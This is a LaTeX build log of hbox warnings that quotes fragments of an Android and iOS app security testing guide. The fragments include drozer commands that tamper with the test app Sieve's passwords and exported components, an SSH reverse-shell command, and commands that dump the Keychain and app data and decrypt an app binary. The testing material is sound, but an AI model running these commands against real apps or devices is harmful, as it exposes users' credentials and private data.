Overfull \hbox (62.6994pt too wide) in paragraph at lines 24692--24692
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Keys/[] 

Overfull \hbox (419.66931pt too wide) in paragraph at lines 24701--24701
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.update content://com.mwr.
example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string Password 
"newpassword"[] 

Overfull \hbox (62.6994pt too wide) in paragraph at lines 24701--24701
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Keys/[] 

Overfull \hbox (119.00435pt too wide) in paragraph at lines 24721--24725
[]\TU/SourceSansPro(0)/m/n/10.95 Enumerating activities in the vulnerable passw
ord manager “Sieve” shows that the activity \TU/SourceCodePro(6)/m/n/10.95 com.
mwr.example.sieve.PWList

Overfull \hbox (104.30939pt too wide) in paragraph at lines 24728--24728
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.activity.start --component com.mwr
.example.sieve com.mwr.example.sieve.PWList[] 
[424]
Overfull \hbox (678.08928pt too wide) in paragraph at lines 24763--24763
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.service.send com.mwr.example.sieve
 com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.exa
mple.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj[] 

Overfull \hbox (1.3794pt too wide) in paragraph at lines 24763--24763
[]\TU/SourceCodePro(6)/m/n/10.95 Got a reply from com.mwr.example.sieve/com.mwr
.example.sieve.AuthService:[] 
[425]
Overfull \hbox (270.74934pt too wide) in paragraph at lines 24791--24791
[]\TU/SourceCodePro(6)/m/n/10.95 dz>  run app.broadcast.send --action theBroadc
ast --extra string phonenumber 07123456789 --extra string newpass 12345[] 
[426]
Underfull \hbox (badness 3128) in paragraph at lines 24884--24887
[]\TU/SourceSansPro(0)/m/n/10.95 To remove all JavaScript source code and local
ly stored data, clear the WebView’s cache with
[427]
Underfull \hbox (badness 1939) in paragraph at lines 24983--24991
[]\TU/SourceCodePro(6)/m/n/10.95 setAllowFileAccess\TU/SourceSansPro(0)/m/n/10.
95 : Enables and disables file access within a WebView. File access

Underfull \hbox (badness 2781) in paragraph at lines 24983--24991
\TU/SourceSansPro(0)/m/n/10.95 is enabled by default. Note that this enables an
d disables [][]file system access[][] only. As-

Underfull \hbox (badness 2142) in paragraph at lines 24983--24991
\TU/SourceSansPro(0)/m/n/10.95 set and resource access is unaffected and access
ible via \TU/SourceCodePro(6)/m/n/10.95 file:///android_asset \TU/SourceSansPro
(0)/m/n/10.95 and
[428] [429] [430] [431] [432]
Underfull \hbox (badness 2035) in paragraph at lines 25261--25280
[]\TU/SourceSansPro(0)/m/n/10.95 There are several ways to serialize the conten
ts of an object to JSON. Android comes with the
[433] [434] [435]
Overfull \hbox (6.48947pt too wide) in paragraph at lines 25433--25439
[]\TU/SourceSansPro(0)/m/n/10.95 Make sure that sensitive data has been encrypt
ed and HMACed/signed after serialization/persistence.
[436]
Underfull \hbox (badness 1983) in paragraph at lines 25573--25576
[]\TU/SourceSansPro(0)/m/n/10.95 In the AndroidManifest, there will be \TU/Sour
ceCodePro(6)/m/n/10.95 meta-data \TU/SourceSansPro(0)/m/n/10.95 entries with va
lues such as \TU/SourceCodePro(6)/m/n/10.95 DATABASE\TU/SourceSansPro(0)/m/n/10
.95 ,
[437] [438] [439] [440]
Overfull \hbox (1.35373pt too wide) in paragraph at lines 25810--25811
[][][]$[][][][][] [] [] [] [][][][][][][][][][][][][][][][][][][][] [] [][][] [
] [][] [][] [][][][][][][] [] [][][][][][][] [] [][][][] [] [][] [] [][][][][][
][] [][] [][][][][][][][][] [][] [][][][] [][] [][][][][][][][][] []

Overfull \hbox (7.87286pt too wide) in paragraph at lines 25828--25830
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][
][][][][][][][][][][][][][][][][][][][][][][][][] []

Overfull \hbox (3.53665pt too wide) in paragraph at lines 25830--25832
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][
][][][][][][][][][][][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 25832--25834
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][] [] [][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][][][
][] [] [][][][][][][][][][] [] [][][][] []
[441]
Underfull \hbox (badness 10000) in paragraph at lines 25846--25848
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][] [] [][][][][][] [][] [][][][] [][] [][][][][][][] [] [][][][][][][] []
[] [][][][][][][] [] [][][][][][][] [][] [][][][][][][] [][] [][][] [][]
[442]
Overfull \hbox (73.06233pt too wide) in paragraph at lines 25981--25983
[]\TU/SourceSansPro(0)/m/n/10.95 APK signatures can be verified with the \TU/So
urceCodePro(6)/m/n/10.95 apksigner \TU/SourceSansPro(0)/m/n/10.95 tool. It is l
ocated at \TU/SourceCodePro(6)/m/n/10.95 [SDK-Path]/build-tools/[version]\TU/So
urceSansPro(0)/m/n/10.95 . 
[443]
Overfull \hbox (25.46947pt too wide) in paragraph at lines 26008--26008
[]      \TU/SourceCodePro(6)/m/n/10.95 [CertPath not validated: Path doesn\[]t 
chain with any of the trust anchors][] 
[444]
Underfull \hbox (badness 3826) in paragraph at lines 26069--26072
[]\TU/SourceSansPro(0)/m/n/10.95 Drozer can be used to determine whether an app
lication is debuggable. The Drozer module

Underfull \hbox (badness 2401) in paragraph at lines 26069--26072
\TU/SourceCodePro(6)/m/n/10.95 app.package.attacksurface \TU/SourceSansPro(0)/m
/n/10.95 also displays information about IPC components exported by
[445]
Overfull \hbox (969.35915pt too wide) in paragraph at lines 26105--26105
[]\TU/SourceCodePro(6)/m/n/10.95 uid=10084(u0_a84) gid=10084(u0_a84) groups=100
83(u0_a83),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(
net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:untrusted_
app:s0:c512,c768[] 

Overfull \hbox (4.66437pt too wide) in paragraph at lines 26148--26148
 []\TU/SourceCodePro(6)/m/n/10.95 $ jdb -connect com.sun.jdi.SocketAttach:hostn
ame=localhost,port=55555[] 
[446]
Overfull \hbox (299.21928pt too wide) in paragraph at lines 26199--26199
[]\TU/SourceCodePro(6)/m/n/10.95 export $NM = $ANDROID_NDK_DIR/toolchains/arm-l
inux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm[] 

Overfull \hbox (286.07933pt too wide) in paragraph at lines 26206--26206
[]\TU/SourceCodePro(6)/m/n/10.95 /tmp/toolchains/arm-linux-androideabi-4.9/preb
uilt/darwin-x86_64/bin/arm-linux-androideabi-nm: libfoo.so: no symbols[] 
[447] [448]
Overfull \hbox (8.12468pt too wide) in paragraph at lines 26283--26287
[]\TU/SourceSansPro(0)/m/n/10.95 To determine whether \TU/SourceCodePro(6)/m/n/
10.95 StrictMode \TU/SourceSansPro(0)/m/n/10.95 is enabled, you can look for th
e \TU/SourceCodePro(6)/m/n/10.95 StrictMode.setThreadPolicy
[449] [450] [451]
Overfull \hbox (36.4194pt too wide) in paragraph at lines 26485--26485
[]    \TU/SourceCodePro(6)/m/n/10.95 id "com.github.hierynomus.license-report" 
version"{license_plugin_version}"[] 
[452]
Overfull \hbox (68.55766pt too wide) in paragraph at lines 26565--26577
[]\TU/SourceSansPro(0)/m/n/10.95 Plan for standard \TU/SourceCodePro(6)/m/n/10.
95 RuntimeException\TU/SourceSansPro(0)/m/n/10.95 s (e.g.\TU/SourceCodePro(6)/m
/n/10.95 NullPointerException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro
(6)/m/n/10.95 IndexOutOfBoundsException\TU/SourceSansPro(0)/m/n/10.95 ,

Underfull \hbox (badness 3713) in paragraph at lines 26565--26577
\TU/SourceCodePro(6)/m/n/10.95 ActivityNotFoundException\TU/SourceSansPro(0)/m/
n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 CancellationException\TU/SourceSansPro
(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 SQLException\TU/SourceSansPro(0)
/m/n/10.95 ) by cre-
[453] [454] [455] [456]
Overfull \hbox (1.37952pt too wide) in paragraph at lines 26850--26850
[]            \TU/SourceCodePro(6)/m/n/10.95 // Includes the default ProGuard r
ules files that are packaged with[] 

Overfull \hbox (3.56953pt too wide) in paragraph at lines 26850--26850
[]            \TU/SourceCodePro(6)/m/n/10.95 // the Android Gradle plugin. To l
earn more, go to the section about[] 
[457] [458]
Underfull \hbox (badness 10000) in paragraph at lines 26966--26969
[]\TU/SourceSansPro(0)/m/n/10.95 Drozer - [][]$[][][][][] [] [] [] [][][][] [] 
[][][][][][][][][][][][][][][] [] [][][] [] [][][][][][] [] [][][][][][][][][] 
[] [][][][] [][] [][][][][][] [][] [][][][] [][] [][][][][] [][] [][][][] [][] 
[][] [][]
[459]
Underfull \hbox (badness 1226) in paragraph at lines 27019--27021
[]\TU/SourceSansPro(0)/m/n/10.95 APK signature scheme with key rotation - [][]$
[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][
] [] [][][][][][][][] [] [][][] []
[460] [461]
Underfull \hbox (badness 10000) in paragraph at lines 27167--27171
[]\TU/SourceSansPro(0)/m/n/10.95 Trust APK information (\TU/SourceCodePro(6)/m/
n/10.95 apkPackageName\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n
/10.95 apkCertificateDigestSha256 \TU/SourceSansPro(0)/m/n/10.95 and
[462]
Underfull \hbox (badness 1478) in paragraph at lines 27207--27211
[]\TU/SourceSansPro(0)/m/n/10.95 Follow this [][]checklist[][] to ensure that y
ou’ve completed each of the steps needed to integrate the
[463]
Overfull \hbox (59.78313pt too wide) in paragraph at lines 27289--27295
[]\TU/SourceSansPro(0)/m/n/10.95 Another way of determining whether \TU/SourceC
odePro(6)/m/n/10.95 su \TU/SourceSansPro(0)/m/n/10.95 exists is attempting to e
xecute it through the \TU/SourceCodePro(6)/m/n/10.95 Runtime.getRuntime.exec
[464]
Underfull \hbox (badness 2608) in paragraph at lines 27298--27306
\TU/SourceSansPro(0)/m/n/10.95 the \TU/SourceCodePro(6)/m/n/10.95 ActivityManag
er.getRunningAppProcesses \TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(
6)/m/n/10.95 manager.getRunningServices
[465] [466] [467]
Overfull \hbox (26.04254pt too wide) in paragraph at lines 27517--27521
[]\TU/SourceSansPro(0)/m/n/10.95 While this might be pretty obvious to circumve
nt for a reverse engineer, you can use \TU/SourceCodePro(6)/m/n/10.95 isDebugge
rConnected
[468] [469]
Overfull \hbox (96.55685pt too wide) in paragraph at lines 27631--27635
[]\TU/SourceSansPro(0)/m/n/10.95 One way to overwrite the method pointers is to
 overwrite the address of the function \TU/SourceCodePro(6)/m/n/10.95 jdwpAdbSt
ate::ProcessIncoming
[470] [471] [472]
Overfull \hbox (36.41943pt too wide) in paragraph at lines 27802--27802
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a151   18190 201   1535844 54908 ffffffff b
6e0f124 S sg.vantagepoint.antidebug[] 

Overfull \hbox (40.79942pt too wide) in paragraph at lines 27802--27802
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a151   18224 18190 1495180 35824 c019a3ac b
6e0ee5c S sg.vantagepoint.antidebug[] 
[473] [474]
Overfull \hbox (42.98943pt too wide) in paragraph at lines 27924--27924
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a152   20267 201   1552508 56796 ffffffff b
6e0f124 S sg.vantagepoint.anti-debug[] 

Overfull \hbox (47.36942pt too wide) in paragraph at lines 27924--27924
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a152   20301 20267 1495192 33980 c019a3ac b
6e0ee5c S sg.vantagepoint.anti-debug[] 
[475] [476] [477]
Underfull \hbox (badness 6445) in paragraph at lines 28109--28113
[]\TU/SourceSansPro(0)/m/n/10.95 The following [][]sample implementation from t
he Android Cracking blog[][] calculates a CRC over
[478] [479] [480] [481] [482] [483]
Overfull \hbox (12.87714pt too wide) in paragraph at lines 28454--28460
\TU/SourceSansPro(0)/m/n/10.95 (e.g. [][]GET_SIGNING_CERTIFICATES[][] 

Overfull \hbox (23.40738pt too wide) in paragraph at lines 28509--28515
\TU/SourceCodePro(6)/m/n/10.95 Runtime.getRuntime().exec 
[484] [485] [486] [487]
Overfull \hbox (5.75964pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getDeviceId()                
          0[]s                     emulator[] 

Overfull \hbox (25.4696pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getLine1 Number()            
          155552155               emulator[] 

Overfull \hbox (80.21959pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkCountryIso()       
          us                      possibly emulator[] 

Overfull \hbox (64.88963pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkType()             
          3                       possibly emulator[] 

Overfull \hbox (110.87949pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkOperator().substrin
g(0,3)    310                     possibly emulator[] 

Overfull \hbox (106.49951pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkOperator().substrin
g(3)      260                     possibly emulator[] 

Overfull \hbox (60.50964pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getPhoneType()               
          1                       possibly emulator[] 

Overfull \hbox (71.45963pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getSimCountryIso()           
          us                      possibly emulator[] 

Overfull \hbox (58.3195pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getSimSerial Number()        
          89014103211118510720    emulator[] 

Overfull \hbox (40.79956pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getSubscriberId()            
          310260000000000         emulator[] 

Overfull \hbox (38.60956pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getVoiceMailNumber()         
          15552175049             emulator[] 
[488]
Overfull \hbox (63.5245pt too wide) in paragraph at lines 28777--28777
[]\TU/SourceCodePro(6)/bx/n/10 if[]\TU/SourceCodePro(6)/m/n/10 (stackTraceEleme
nt.[]getClassName[]().[]equals[]([]"com.android.internal.os.ZygoteInit"[])) 
[489]
Overfull \hbox (63.5245pt too wide) in paragraph at lines 28787--28787
[]\TU/SourceCodePro(6)/bx/n/10 if[]\TU/SourceCodePro(6)/m/n/10 (stackTraceEleme
nt.[]getClassName[]().[]equals[]([]"de.robv.android.xposed.XposedBridge"[]) 

Overfull \hbox (63.5245pt too wide) in paragraph at lines 28791--28791
[]\TU/SourceCodePro(6)/bx/n/10 if[]\TU/SourceCodePro(6)/m/n/10 (stackTraceEleme
nt.[]getClassName[]().[]equals[]([]"de.robv.android.xposed.XposedBridge"[]) 
[490] [491]
Overfull \hbox (156.98944pt too wide) in paragraph at lines 28940--28940
\TU/SourceCodePro(6)/m/it/10 <https://developer.android.com/reference/android/s
ecurity/keystore/KeyGenParameterSpec.html>[]|  
[492]
Overfull \hbox (156.98944pt too wide) in paragraph at lines 28967--28967
\TU/SourceCodePro(6)/m/it/10 <https://developer.android.com/reference/android/s
ecurity/keystore/KeyGenParameterSpec.html>[]|  
[493]
Underfull \hbox (badness 10000) in paragraph at lines 29068--29070
[]\TU/SourceCodePro(6)/m/n/10.95 Settings.Secure.bluetooth_address\TU/SourceSan
sPro(0)/m/n/10.95 , unless the system permission LO-
[494]
Overfull \hbox (224.53432pt too wide) in paragraph at lines 29092--29096
\TU/SourceCodePro(6)/m/n/10.95 Build.Serial\TU/SourceSansPro(0)/m/n/10.95 . The
 file should contain the permission \TU/SourceCodePro(6)/m/n/10.95 <uses-permis
sion android:name="android.permission.READ_PHONE_STATE"

Overfull \hbox (7.42747pt too wide) in paragraph at lines 29098--29100
[]\TU/SourceSansPro(0)/m/n/10.95 Apps for Android 8.0 (API level 26) will get t
he result “UNKNOWN” when they request \TU/SourceCodePro(6)/m/n/10.95 Build.Seri
al\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (2.6277pt too wide) in paragraph at lines 29134--29138
[]\TU/SourceSansPro(0)/m/n/10.95 Copy the contents of \TU/SourceCodePro(6)/m/n/
10.95 /data/data/<your appid>/cache \TU/SourceSansPro(0)/m/n/10.95 and \TU/Sour
ceCodePro(6)/m/n/10.95 shared-preferences

Overfull \hbox (51.87105pt too wide) in paragraph at lines 29152--29155
[]\TU/SourceSansPro(0)/m/n/10.95 Execute \TU/SourceCodePro(6)/m/n/10.95 run-as 
<your app-id>\TU/SourceSansPro(0)/m/n/10.95 . Your app-id is the package descri
bed in \TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml\TU/SourceSansPro(0)/m
/n/10.95 . 
[495] [496]
Overfull \hbox (30.89949pt too wide) in paragraph at lines 29234--29234
\TU/SourceCodePro(6)/m/n/10 iid.[]getToken[](tokenItem.[]authorizedEntity[],tok
enItem.[]scope[],tokenItem.[]options[]);|  
[497] [498]
Underfull \hbox (badness 10000) in paragraph at lines 29388--29392
[]\TU/SourceCodePro(6)/m/n/10.95 Settings.Secure.bluetooth_address \TU/SourceSa
nsPro(0)/m/n/10.95 or \TU/SourceCodePro(6)/m/n/10.95 WifiInfo.getMacAddress \TU
/SourceSansPro(0)/m/n/10.95 from

Underfull \hbox (badness 1112) in paragraph at lines 29407--29411
[]\TU/SourceSansPro(0)/m/n/10.95 To make sure that the identifiers can be used,
 check \TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml \TU/SourceSansPro(0)/
m/n/10.95 for usage of the

Underfull \hbox (badness 2781) in paragraph at lines 29407--29411
\TU/SourceSansPro(0)/m/n/10.95 IMEI and \TU/SourceCodePro(6)/m/n/10.95 Build.Se
rial\TU/SourceSansPro(0)/m/n/10.95 . The manifest should contain the permission
 \TU/SourceCodePro(6)/m/n/10.95 <uses-permission
[499]
Underfull \hbox (badness 2253) in paragraph at lines 29499--29501
[]\TU/SourceSansPro(0)/m/n/10.95 SafetyNet Attestation API - Quota Request - []
[]$[][][][][] [] [] [] [][][][][][][] [] [][][][][][] [] [][][] [] [][][][][][]
[][][][] [] [][][][][][][] [][]
[500] [501] [502]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d4e80dd1320b9b3dc91c94b0608a477026670825.
png" > [503] [504] [505] [506]
Overfull \hbox (7.5151pt too wide) in paragraph at lines 29770--29775
[]\TU/SourceSansPro(0)/m/n/10.95 The app process is restricted to its own direc
tory (under /var/mobile/Containers/Bundle/Application/
[507]
Underfull \hbox (badness 1137) in paragraph at lines 29867--29872
[]\TU/SourceCodePro(6)/m/n/10.95 /iTunesMetadata.plist \TU/SourceSansPro(0)/m/n
/10.95 contains various bits of information, including the developer’s
[508]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/fa9295f5a7912d06f00eca6564a177c1bf1338c5.
png" > [509] [510] [511]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cf54b9aca2296ed3eaa6ecf814484f24668e5af6.
png" > [512] [513] [514] [515] [516] [517] [518] [519] [520]
Overfull \hbox (84.59961pt too wide) in paragraph at lines 30737--30737
[]   \TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC     ARM         V7  0x00     EXECU
TE    39       5016   NOUNDEFS DYLDLINK TWOLEVEL PIE[] 

Overfull \hbox (97.73956pt too wide) in paragraph at lines 30737--30737
[]\TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC_64   ARM64        ALL  0x00     EXECU
TE    38       5728   NOUNDEFS DYLDLINK TWOLEVEL PIE[] 

Overfull \hbox (145.91933pt too wide) in paragraph at lines 30748--30748
[]\TU/SourceCodePro(6)/m/n/10.95 $ dsdump --objc --color --verbose=5 --arch arm
64 --defined [APP_MAIN_BINARY_FILE] > /tmp/OBJC.txt[] 

Overfull \hbox (73.64946pt too wide) in paragraph at lines 30748--30748
[]\TU/SourceCodePro(6)/m/n/10.95 # Dump the Swift type descriptors to a tempora
ry file if the app is implemented in Swift[] 

Overfull \hbox (159.05933pt too wide) in paragraph at lines 30748--30748
[]\TU/SourceCodePro(6)/m/n/10.95 $ dsdump --swift --color --verbose=5 --arch ar
m64 --defined [APP_MAIN_BINARY_FILE] > /tmp/SWIFT.txt[] 

Overfull \hbox (49.5594pt too wide) in paragraph at lines 30767--30767
[]\TU/SourceCodePro(6)/m/n/10.95 $ docker run -it -p 8000:8000 opensecurity/mob
ile-security-framework-mobsf:latest[] 
[521]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a70d91db8c881c205f3831ecfd5d5432ce6c4610.
png" > [522] [523]
Overfull \hbox (73.6494pt too wide) in paragraph at lines 30914--30914
[]\TU/SourceCodePro(6)/m/n/10.95 OWASP.iGoat-Swift on (iPhone: 12.0) [usb] # io
s hooking list class_methods <ClassName>[] 

Overfull \hbox (10.1394pt too wide) in paragraph at lines 30950--30950
[]\TU/SourceCodePro(6)/m/n/10.95 $ objection patchipa --source my-app.ipa --cod
esign-signature 0C2E8200Dxxxx[] 
[524]
Overfull \hbox (165.62943pt too wide) in paragraph at lines 31000--31000
[]\TU/SourceCodePro(6)/m/n/10.95 # Dump the Keychain, including access modifier
s. The result will be written to the host in myfile.json[] 
[525]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/fe6365453719e80590d3afce7e4cc779feb735be.
png" > [526]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/941c3323ce1e22f1181dbd2b8ebcd856dd4552a7.
png" > [527] [528] [529]
Overfull \hbox (60.21677pt too wide) in paragraph at lines 31220--31222
[]\TU/SourceSansPro(0)/m/n/10.95 Opening a reverse shell over SSH can be done b
y running the command \TU/SourceCodePro(6)/m/n/10.95 ssh -R <remote_port>:local
host:22

Overfull \hbox (321.11931pt too wide) in paragraph at lines 31258--31258
[]\TU/SourceCodePro(6)/m/n/10.95 iPhone:~ root# tar czvf /tmp/data.tgz /private
/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693[] 

[530]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7d582611b62d36df15e2e70aa59f9b3edb63ceb5.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/47ac539e21259f375afeadf39e3185e10750e8d0.
png" > [531]
Overfull \hbox (242.27933pt too wide) in paragraph at lines 31308--31308
[]\TU/SourceCodePro(6)/m/n/10.95 Current directory: /var/containers/Bundle/Appl
ication/DABF849D-493E-464C-B66B-B8B6C53A4E76/org.owasp.MSTG.app[] 

Overfull \hbox (382.4393pt too wide) in paragraph at lines 31316--31316
[]\TU/SourceCodePro(6)/m/n/10.95 org.owasp.MSTG on (iPhone: 10.3.3) [usb] # cd 
/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Do
cuments[] 

Overfull \hbox (95.54933pt too wide) in paragraph at lines 31316--31316
[]\TU/SourceCodePro(6)/m/n/10.95 /var/mobile/Containers/Data/Application/72C7AA
FB-1D75-4FBA-9D83-D8B4A2D44133/Documents[] 

Overfull \hbox (215.99937pt too wide) in paragraph at lines 31329--31329
[]\TU/SourceCodePro(6)/m/n/10.95 org.owasp.MSTG on (iPhone: 10.3.3) [usb] # fil
e download .com.apple.mobile_container_manager.metadata.plist[] 

Overfull \hbox (791.96916pt too wide) in paragraph at lines 31329--31329
[]\TU/SourceCodePro(6)/m/n/10.95 Downloading /var/mobile/Containers/Data/Applic
ation/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.
metadata.plist to .com.apple.mobile_container_manager.metadata.plist[] 

Overfull \hbox (868.61916pt too wide) in paragraph at lines 31329--31329
[]\TU/SourceCodePro(6)/m/n/10.95 Successfully downloaded /var/mobile/Containers
/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_contai
ner_manager.metadata.plist to .com.apple.mobile_container_manager.metadata.plis
t[] 
[532]
Overfull \hbox (246.65932pt too wide) in paragraph at lines 31348--31348
[]\TU/SourceCodePro(6)/m/n/10.95 itms-services://?action=download-manifest&url=
https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist[] 

Overfull \hbox (467.84929pt too wide) in paragraph at lines 31362--31362
[]\TU/SourceCodePro(6)/m/n/10.95 # itms-services -u "itms-services://?action=do
wnload-manifest&url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.p
list" -o - > out.ipa[] 

Overfull \hbox (82.40947pt too wide) in paragraph at lines 31424--31424
[]\TU/SourceCodePro(6)/m/n/10.95 //     Generated by class-dump 3.5 (64 bit) (D
ebug version compiled Jun  9 2015 22:53:21).[] 

Overfull \hbox (45.17947pt too wide) in paragraph at lines 31424--31424
[]\TU/SourceCodePro(6)/m/n/10.95 //     class-dump is Copyright (C) 1997-1998, 
2000-2001, 2004-2014 by Steve Nygard.[] 
[533]
Overfull \hbox (56.12941pt too wide) in paragraph at lines 31449--31449
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-04 20:16:57.807 Clutch[2449:440427] co
mmand: Prints installed applications[] 
[534]
Overfull \hbox (108.68944pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-04 20:19:28.460 Clutch[2450:440574] co
mmand: Dump specified bundleID into .ipa file[] 

Overfull \hbox (402.14938pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 ph.telegra.Telegraph contains watchOS 2 compat
ible application. It[]s not possible to dump watchOS 2 apps with Clutch (null) 
at this moment.[] 

Overfull \hbox (159.05942pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-04 20:19:29.825 clutch[2465:440618] co
mmand: Only dump binary files from specified bundleID[] 

Overfull \hbox (119.63936pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 DONE: /private/var/mobile/Documents/Dumped/ph.
telegra.Telegraph-iOS9.0-(Clutch-(null)).ipa[] 

Overfull \hbox (82.40947pt too wide) in paragraph at lines 31496--31496
[]\TU/SourceCodePro(6)/m/n/10.95 //     Generated by class-dump 3.5 (64 bit) (D
ebug version compiled Jun  9 2015 22:53:21).[] 

Overfull \hbox (45.17947pt too wide) in paragraph at lines 31496--31496
[]\TU/SourceCodePro(6)/m/n/10.95 //     class-dump is Copyright (C) 1997-1998, 
2000-2001, 2004-2014 by Steve Nygard.[] 

Overfull \hbox (56.12943pt too wide) in paragraph at lines 31496--31496
[]\TU/SourceCodePro(6)/m/n/10.95 typedef void (^CDUnknownBlockType)(void); // r
eturn type and parameters are unknown[] 
[535] [536]
Overfull \hbox (399.95929pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 start dump /private/var/containers/Bundle/Appl
ication/14002D30-B113-4FDF-BD25-1BF740383149/Telegram.app/Frameworks/libswiftsi
md.dylib[] 

Overfull \hbox (7.9494pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 libswiftsimd.dylib.fid: 100%|██████████| 343k/
343k [00:00<00:00, 1.54MB/s][] 

Overfull \hbox (426.23929pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 start dump /private/var/containers/Bundle/Appl
ication/14002D30-B113-4FDF-BD25-1BF740383149/Telegram.app/Frameworks/libswiftCo
reData.dylib[] 

Overfull \hbox (40.79938pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 libswiftCoreData.dylib.fid: 100%|██████████| 8
2.5k/82.5k [00:00<00:00, 477kB/s][] 
[537]
Overfull \hbox (117.44943pt too wide) in paragraph at lines 31646--31646
[]\TU/SourceCodePro(6)/m/n/10.95 # The following command will show detailed inf
ormation about the iOS device connected via USB.[] 

Overfull \hbox (82.40936pt too wide) in paragraph at lines 31646--31646
[]\TU/SourceCodePro(6)/m/n/10.95 WARNING: could not locate Payload/iGoat-Swift.
app/SC_Info/iGoat-Swift.sinf in archive![] 

Overfull \hbox (522.5994pt too wide) in paragraph at lines 31646--31646
[]\TU/SourceCodePro(6)/m/n/10.95 # The following command will start the app in 
debug mode, by providing the bundle name. The bundle name can be found in the p
revious command after "Installing".[] 
[538] [539] [540]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/10a4f9e98e7c4b14b4396229660b6b6c0fe7f30d.
png" > [541] [542]
Overfull \hbox (102.94426pt too wide) in paragraph at lines 31941--31946
[]\TU/SourceSansPro(0)/m/n/10.95 Exported/imported \TU/SourceSansPro(0)/m/it/10
.95 custom document types\TU/SourceSansPro(0)/m/n/10.95 : \TU/SourceCodePro(6)/
m/n/10.95 UTExportedTypeDeclarations\TU/SourceSansPro(0)/m/n/10.95 /\TU/SourceC
odePro(6)/m/n/10.95 UTImportedTypeDeclarations
[543]
